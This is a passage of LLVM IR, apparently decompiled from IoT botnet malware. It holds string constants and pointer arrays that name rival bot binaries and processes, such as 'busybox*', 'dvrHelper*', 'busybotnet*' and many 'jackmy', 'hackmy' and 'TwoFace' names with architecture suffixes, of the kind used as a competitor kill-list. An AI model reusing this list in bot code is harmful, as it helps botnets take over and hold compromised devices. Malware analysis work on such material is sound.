@global_var_25f00.710, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25f0c.711, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25f18.712, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25f24.713, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25f2c.714, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25f34.715, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25f40.716, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25f4c.717, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25f58.718, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25f64.719, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25f6c.720, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_25f78.721, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25f88.722, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25f90.723, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25f98.724, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25fa4.725, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25fb0.726, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25fbc.727, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25fcc.728, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25fdc.729, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25fec.730, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25ffc.731, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_26008.732, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_26014.733, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_26024.734, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_26034.735, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_26044.736, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_26054.737, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_26060.738, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_26070.739, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_26084.740, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_26090.741, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2609c.742, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_260ac.743, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_260bc.744, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25aac.605, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_260c8.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_260d4.746, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_260dc.747, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_260e4.748, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_260ec.749, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_260f4.750, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_260fc.751, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_26104.752, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2610c.753, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_26114.754, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2611c.755, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_26124.756, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2612c.757, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_26134.758, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2613c.759, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_26144.760, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2614c.761, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_26154.762, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2615c.763, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_26164.764, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2616c.765, i32 0, i32 0), i8* bitcast (i32* @global_var_26174.766 to i8*), i8* bitcast (i32* @global_var_26178.767 to i8*), i8* bitcast (i32* @global_var_2617c.768 to i8*), i8* bitcast (i32* @global_var_26180.769 to i8*), i8* bitcast (i32* @global_var_26184.770 to i8*), i8* bitcast (i32* @global_var_26188.771 to i8*), i8* bitcast (i32* @global_var_2618c.772 to i8*), i8* bitcast (i32* @global_var_26190.773 to i8*), i8* bitcast (i32* @global_var_26194.774 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_26198.775, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2619c.776, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261a0.777, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261a4.778, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261a8.779, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261ac.780, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261b0.781, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261b4.782, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261b8.783, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261bc.784, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261c0.785, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261c4.786, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_261c8.787, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_261d4.788, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_261dc.789, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_261e4.790, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261ec.791, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261f0.792, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261f4.793, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261f8.794, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_261fc.795, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_26200.796, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_26204.797, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_26208.798, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2620c.799, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26210.800, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26214.801, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26218.802, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2621c.803, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26220.804, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26224.805, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26228.806, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2622c.807, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26230.808, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26234.809, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_26238.810, i32 0, i32 0)]
@global_var_24cc4.813 = constant [8 x i8] c"jackmy*\00"
@global_var_24ccc.814 = constant [9 x i8] c"busybox*\00"
@global_var_24cd8.815 = constant [5 x i8] c"bin*\00"
@global_var_24cf0.816 = constant [5 x i8] c"arm*\00"
@global_var_24cf8.817 = constant [8 x i8] c"mipsel*\00"
@global_var_24d08.818 = constant [8 x i8] c"mips64*\00"
@global_var_24d10.819 = constant [6 x i8] c"i686*\00"
@global_var_24d18.820 = constant [7 x i8] c"sparc*\00"
@global_var_24d44.821 = constant [6 x i8] c"bruv*\00"
@global_var_24d4c.822 = constant [7 x i8] c"sh2eb*\00"
@global_var_24d54.823 = constant [8 x i8] c"sh2elf*\00"
@global_var_24d5c.824 = constant [5 x i8] c"x86*\00"
@global_var_24d64.825 = constant [7 x i8] c"armv5*\00"
@global_var_24d6c.826 = constant [9 x i8] c"armv4tl*\00"
@global_var_24d78.827 = constant [7 x i8] c"armv4*\00"
@global_var_24d80.828 = constant [7 x i8] c"armv6*\00"
@global_var_24d88.829 = constant [9 x i8] c"powerpc*\00"
@global_var_24d94.830 = constant [14 x i8] c"powerpc440fp*\00"
@global_var_24da4.831 = constant [6 x i8] c"i586*\00"
@global_var_24dac.832 = constant [6 x i8] c"m68k*\00"
@global_var_24db4.833 = constant [8 x i8] c"x86_64*\00"
@global_var_24dbc.834 = constant [12 x i8] c"jackmymips*\00"
@global_var_24dc8.835 = constant [14 x i8] c"jackmymips64*\00"
@global_var_24dd8.836 = constant [14 x i8] c"jackmymipsel*\00"
@global_var_24de8.837 = constant [13 x i8] c"jackmysh2eb*\00"
@global_var_24df8.838 = constant [14 x i8] c"jackmysh2elf*\00"
@global_var_24e08.839 = constant [11 x i8] c"jackmysh4*\00"
@global_var_24e14.840 = constant [11 x i8] c"jackmyx86*\00"
@global_var_24e20.841 = constant [13 x i8] c"jackmyarmv5*\00"
@global_var_24e30.842 = constant [15 x i8] c"jackmyarmv4tl*\00"
@global_var_24e40.843 = constant [13 x i8] c"jackmyarmv4*\00"
@global_var_24e50.844 = constant [13 x i8] c"jackmyarmv6*\00"
@global_var_24e60.845 = constant [12 x i8] c"jackmyi686*\00"
@global_var_24e6c.846 = constant [15 x i8] c"jackmypowerpc*\00"
@global_var_24e7c.847 = constant [20 x i8] c"jackmypowerpc440fp*\00"
@global_var_24e90.848 = constant [12 x i8] c"jackmyi586*\00"
@global_var_24e9c.849 = constant [12 x i8] c"jackmym68k*\00"
@global_var_24ea8.850 = constant [13 x i8] c"jackmysparc*\00"
@global_var_24eb8.851 = constant [14 x i8] c"jackmyx86_64*\00"
@global_var_24ec8.852 = constant [12 x i8] c"hackmymips*\00"
@global_var_24ed4.853 = constant [14 x i8] c"hackmymips64*\00"
@global_var_24ee4.854 = constant [14 x i8] c"hackmymipsel*\00"
@global_var_24ef4.855 = constant [13 x i8] c"hackmysh2eb*\00"
@global_var_24f04.856 = constant [14 x i8] c"hackmysh2elf*\00"
@global_var_24f14.857 = constant [11 x i8] c"hackmysh4*\00"
@global_var_24f20.858 = constant [11 x i8] c"hackmyx86*\00"
@global_var_24f2c.859 = constant [13 x i8] c"hackmyarmv5*\00"
@global_var_24f3c.860 = constant [15 x i8] c"hackmyarmv4tl*\00"
@global_var_24f4c.861 = constant [13 x i8] c"hackmyarmv4*\00"
@global_var_24f5c.862 = constant [13 x i8] c"hackmyarmv6*\00"
@global_var_24f6c.863 = constant [12 x i8] c"hackmyi686*\00"
@global_var_24f78.864 = constant [15 x i8] c"hackmypowerpc*\00"
@global_var_24f88.865 = constant [20 x i8] c"hackmypowerpc440fp*\00"
@global_var_24f9c.866 = constant [12 x i8] c"hackmyi586*\00"
@global_var_24fa8.867 = constant [12 x i8] c"hackmym68k*\00"
@global_var_24fb4.868 = constant [13 x i8] c"hackmysparc*\00"
@global_var_24fc4.869 = constant [14 x i8] c"hackmyx86_64*\00"
@global_var_24fd4.870 = constant [4 x i8] c"b1*\00"
@global_var_24fd8.871 = constant [4 x i8] c"b2*\00"
@global_var_24fdc.872 = constant [4 x i8] c"b3*\00"
@global_var_24fe0.873 = constant [4 x i8] c"b4*\00"
@global_var_24fe4.874 = constant [4 x i8] c"b5*\00"
@global_var_24fe8.875 = constant [4 x i8] c"b6*\00"
@global_var_24fec.876 = constant [4 x i8] c"b7*\00"
@global_var_24ff0.877 = constant [4 x i8] c"b8*\00"
@global_var_24ff4.878 = constant [4 x i8] c"b9*\00"
@global_var_24ff8.879 = constant [5 x i8] c"b10*\00"
@global_var_25000.880 = constant [5 x i8] c"b11*\00"
@global_var_25008.881 = constant [5 x i8] c"b12*\00"
@global_var_25010.882 = constant [5 x i8] c"b13*\00"
@global_var_25018.883 = constant [5 x i8] c"b14*\00"
@global_var_25020.884 = constant [5 x i8] c"b15*\00"
@global_var_25028.885 = constant [5 x i8] c"b16*\00"
@global_var_25030.886 = constant [5 x i8] c"b17*\00"
@global_var_25038.887 = constant [5 x i8] c"b18*\00"
@global_var_25040.888 = constant [5 x i8] c"b19*\00"
@global_var_25048.889 = constant [5 x i8] c"b20*\00"
@global_var_25050.890 = constant [18 x i8] c"busyboxterrorist*\00"
@global_var_25064.891 = constant [10 x i8] c"DFhxdhdf*\00"
@global_var_25070.892 = constant [11 x i8] c"dvrHelper*\00"
@global_var_2507c.893 = constant [9 x i8] c"FDFDHFC*\00"
@global_var_25088.894 = constant [6 x i8] c"FEUB*\00"
@global_var_25090.895 = constant [10 x i8] c"FTUdftui*\00"
@global_var_2509c.896 = constant [10 x i8] c"GHfjfgvj*\00"
@global_var_250a8.897 = constant [7 x i8] c"jhUOH*\00"
@global_var_250b0.898 = constant [10 x i8] c"JIPJIPJj*\00"
@global_var_250bc.899 = constant [11 x i8] c"JIPJuipjh*\00"
@global_var_250c8.900 = constant [9 x i8] c"kmymips*\00"
@global_var_250d4.901 = constant [11 x i8] c"kmymips64*\00"
@global_var_250e0.902 = constant [11 x i8] c"kmymipsel*\00"
@global_var_250ec.903 = constant [10 x i8] c"kmysh2eb*\00"
@global_var_250f8.904 = constant [11 x i8] c"kmysh2elf*\00"
@global_var_25104.905 = constant [8 x i8] c"kmysh4*\00"
@global_var_2510c.906 = constant [8 x i8] c"kmyx86*\00"
@global_var_25114.907 = constant [10 x i8] c"kmyarmv5*\00"
@global_var_25120.908 = constant [12 x i8] c"kmyarmv4tl*\00"
@global_var_2512c.909 = constant [10 x i8] c"kmyarmv4*\00"
@global_var_25138.910 = constant [10 x i8] c"kmyarmv6*\00"
@global_var_25144.911 = constant [9 x i8] c"kmyi686*\00"
@global_var_25150.912 = constant [12 x i8] c"kmypowerpc*\00"
@global_var_2515c.913 = constant [17 x i8] c"kmypowerpc440fp*\00"
@global_var_25170.914 = constant [9 x i8] c"kmyi586*\00"
@global_var_2517c.915 = constant [9 x i8] c"kmym68k*\00"
@global_var_25188.916 = constant [10 x i8] c"kmysparc*\00"
@global_var_25194.917 = constant [11 x i8] c"kmyx86_64*\00"
@global_var_251a0.918 = constant [9 x i8] c"lolmips*\00"
@global_var_251ac.919 = constant [11 x i8] c"lolmips64*\00"
@global_var_251b8.920 = constant [11 x i8] c"lolmipsel*\00"
@global_var_251c4.921 = constant [10 x i8] c"lolsh2eb*\00"
@global_var_251d0.922 = constant [11 x i8] c"lolsh2elf*\00"
@global_var_251dc.923 = constant [8 x i8] c"lolsh4*\00"
@global_var_251e4.924 = constant [8 x i8] c"lolx86*\00"
@global_var_251ec.925 = constant [10 x i8] c"lolarmv5*\00"
@global_var_251f8.926 = constant [12 x i8] c"lolarmv4tl*\00"
@global_var_25204.927 = constant [10 x i8] c"lolarmv4*\00"
@global_var_25210.928 = constant [10 x i8] c"lolarmv6*\00"
@global_var_2521c.929 = constant [9 x i8] c"loli686*\00"
@global_var_25228.930 = constant [12 x i8] c"lolpowerpc*\00"
@global_var_25234.931 = constant [17 x i8] c"lolpowerpc440fp*\00"
@global_var_25248.932 = constant [9 x i8] c"loli586*\00"
@global_var_25254.933 = constant [9 x i8] c"lolm68k*\00"
@global_var_25260.934 = constant [10 x i8] c"lolsparc*\00"
@global_var_2526c.935 = constant [9 x i8] c"RYrydry*\00"
@global_var_25278.936 = constant [9 x i8] c"telmips*\00"
@global_var_25284.937 = constant [11 x i8] c"telmips64*\00"
@global_var_25290.938 = constant [11 x i8] c"telmipsel*\00"
@global_var_2529c.939 = constant [10 x i8] c"telsh2eb*\00"
@global_var_252a8.940 = constant [11 x i8] c"telsh2elf*\00"
@global_var_252b4.941 = constant [8 x i8] c"telsh4*\00"
@global_var_252bc.942 = constant [8 x i8] c"telx86*\00"
@global_var_252c4.943 = constant [10 x i8] c"telarmv5*\00"
@global_var_252d0.944 = constant [12 x i8] c"telarmv4tl*\00"
@global_var_252dc.945 = constant [10 x i8] c"telarmv4*\00"
@global_var_252e8.946 = constant [10 x i8] c"telarmv6*\00"
@global_var_252f4.947 = constant [9 x i8] c"teli686*\00"
@global_var_25300.948 = constant [12 x i8] c"telpowerpc*\00"
@global_var_2530c.949 = constant [17 x i8] c"telpowerpc440fp*\00"
@global_var_25320.950 = constant [9 x i8] c"teli586*\00"
@global_var_2532c.951 = constant [9 x i8] c"telm68k*\00"
@global_var_25338.952 = constant [10 x i8] c"telsparc*\00"
@global_var_25344.953 = constant [11 x i8] c"telx86_64*\00"
@global_var_25350.954 = constant [13 x i8] c"TwoFacemips*\00"
@global_var_25360.955 = constant [15 x i8] c"TwoFacemips64*\00"
@global_var_25370.956 = constant [15 x i8] c"TwoFacemipsel*\00"
@global_var_25380.957 = constant [14 x i8] c"TwoFacesh2eb*\00"
@global_var_25390.958 = constant [15 x i8] c"TwoFacesh2elf*\00"
@global_var_253a0.959 = constant [12 x i8] c"TwoFacesh4*\00"
@global_var_253ac.960 = constant [12 x i8] c"TwoFacex86*\00"
@global_var_253b8.961 = constant [14 x i8] c"TwoFacearmv5*\00"
@global_var_253c8.962 = constant [16 x i8] c"TwoFacearmv4tl*\00"
@global_var_253d8.963 = constant [14 x i8] c"TwoFacearmv4*\00"
@global_var_253e8.964 = constant [14 x i8] c"TwoFacearmv6*\00"
@global_var_253f8.965 = constant [13 x i8] c"TwoFacei686*\00"
@global_var_25408.966 = constant [16 x i8] c"TwoFacepowerpc*\00"
@global_var_25418.967 = constant [21 x i8] c"TwoFacepowerpc440fp*\00"
@global_var_25430.968 = constant [13 x i8] c"TwoFacei586*\00"
@global_var_25440.969 = constant [13 x i8] c"TwoFacem68k*\00"
@global_var_25450.970 = constant [14 x i8] c"TwoFacesparc*\00"
@global_var_25460.971 = constant [15 x i8] c"TwoFacex86_64*\00"
@global_var_25470.972 = constant [10 x i8] c"UYyuyioy*\00"
@global_var_2547c.973 = constant [10 x i8] c"XDzdfxzf*\00"
@global_var_25488.974 = constant [6 x i8] c"xxb1*\00"
@global_var_25490.975 = constant [6 x i8] c"xxb2*\00"
@global_var_25498.976 = constant [6 x i8] c"xxb3*\00"
@global_var_254a0.977 = constant [6 x i8] c"xxb4*\00"
@global_var_254a8.978 = constant [6 x i8] c"xxb5*\00"
@global_var_254b0.979 = constant [6 x i8] c"xxb6*\00"
@global_var_254b8.980 = constant [6 x i8] c"xxb7*\00"
@global_var_254c0.981 = constant [6 x i8] c"xxb8*\00"
@global_var_254c8.982 = constant [6 x i8] c"xxb9*\00"
@global_var_254d0.983 = constant [7 x i8] c"xxb10*\00"
@global_var_254d8.984 = constant [7 x i8] c"xxb11*\00"
@global_var_254e0.985 = constant [7 x i8] c"xxb12*\00"
@global_var_254e8.986 = constant [7 x i8] c"xxb13*\00"
@global_var_254f0.987 = constant [7 x i8] c"xxb14*\00"
@global_var_254f8.988 = constant [7 x i8] c"xxb15*\00"
@global_var_25500.989 = constant [7 x i8] c"xxb16*\00"
@global_var_25508.990 = constant [7 x i8] c"xxb17*\00"
@global_var_25510.991 = constant [7 x i8] c"xxb18*\00"
@global_var_25518.992 = constant [7 x i8] c"xxb19*\00"
@global_var_25520.993 = constant [7 x i8] c"xxb20*\00"
@global_var_25528.994 = constant [3 x i8] c"1*\00"
@global_var_2552c.995 = constant [3 x i8] c"2*\00"
@global_var_25530.996 = constant [3 x i8] c"3*\00"
@global_var_25534.997 = constant [3 x i8] c"4*\00"
@global_var_25538.998 = constant [3 x i8] c"5*\00"
@global_var_2553c.999 = constant [3 x i8] c"6*\00"
@global_var_25540.1000 = constant [3 x i8] c"7*\00"
@global_var_25544.1001 = constant [3 x i8] c"8*\00"
@global_var_25548.1002 = constant [3 x i8] c"9*\00"
@global_var_2554c.1003 = constant [4 x i8] c"10*\00"
@global_var_25550.1004 = constant [4 x i8] c"11*\00"
@global_var_25554.1005 = constant [4 x i8] c"12*\00"
@global_var_25558.1006 = constant [4 x i8] c"13*\00"
@global_var_2555c.1007 = constant [4 x i8] c"14*\00"
@global_var_25560.1008 = constant [4 x i8] c"15*\00"
@global_var_25564.1009 = constant [4 x i8] c"16*\00"
@global_var_25568.1010 = constant [4 x i8] c"17*\00"
@global_var_2556c.1011 = constant [4 x i8] c"18*\00"
@global_var_25570.1012 = constant [4 x i8] c"19*\00"
@global_var_25574.1013 = constant [4 x i8] c"20*\00"
@global_var_25578.1014 = constant [4 x i8] c"bb*\00"
@global_var_2557c.1015 = constant [12 x i8] c"busybotnet*\00"
@global_var_25588.1016 = constant [6 x i8] c"pppd*\00"
@global_var_25590.1017 = constant [7 x i8] c"pppoe*\00"
@global_var_25598.1018 = constant [6 x i8] c"wput*\00"
@global_var_255a0.1019 = constant [4 x i8] c"B1*\00"
@global_var_255a4.1020 = constant [4 x i8] c"B2*\00"
@global_var_255a8.1021 = constant [4 x i8] c"B3*\00"
@global_var_255ac.1022 = constant [4 x i8] c"B4*\00"
@global_var_255b0.1023 = constant [4 x i8] c"B5*\00"
@global_var_255b4.1024 = constant [4 x i8] c"B6*\00"
@global_var_255b8.1025 = constant [4 x i8] c"B7*\00"
@global_var_255bc.1026 = constant [4 x i8] c"B8*\00"
@global_var_255c0.1027 = constant [4 x i8] c"B9*\00"
@global_var_255c4.1028 = constant [5 x i8] c"B10*\00"
@global_var_255cc.1029 = constant [5 x i8] c"B11*\00"
@global_var_255d4.1030 = constant [5 x i8] c"B12*\00"
@global_var_255dc.1031 = constant [5 x i8] c"B13*\00"
@global_var_255e4.1032 = constant [5 x i8] c"B14*\00"
@global_var_255ec.1033 = constant [5 x i8] c"B15*\00"
@global_var_255f4.1034 = constant [5 x i8] c"B16*\00"
@global_var_255fc.1035 = constant [5 x i8] c"B17*\00"
@global_var_25604.1036 = constant [5 x i8] c"B18*\00"
@global_var_2560c.1037 = constant [5 x i8] c"B20*\00"
@global_var_25614.1038 = constant [11 x i8] c"dvrhelper*\00"
@global_var_25620.1039 = constant [241 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24cc4.813, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_24ccc.814, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24cd8.815, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24ce0.579, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24ce8.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24cf0.816, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24cf8.817, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24d00.578, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24d08.818, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24d10.819, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d18.820, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24d20.582, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24d28.573, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_24d30.583, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d3c.575, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24d44.821, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24d00.578, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24d08.818, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24cf8.817, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d4c.822, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24d54.823, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24d20.582, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24d5c.824, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24cf0.816, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d64.825, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_24d6c.826, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d78.827, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d80.828, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24d10.819, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_24d88.829, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24d94.830, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24da4.831, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24dac.832, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d18.820, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24db4.833, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24dbc.834, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24dc8.835, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24dd8.836, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24de8.837, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24df8.838, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_24e08.839, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_24e14.840, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24e20.841, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_24e30.842, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24e40.843, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24e50.844, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24e60.845, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_24e6c.846, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_24e7c.847, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24e90.848, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24e9c.849, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24ea8.850, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24eb8.851, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24ec8.852, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24ed4.853, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24ee4.854, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24ef4.855, i32 0, i32 0), i8* 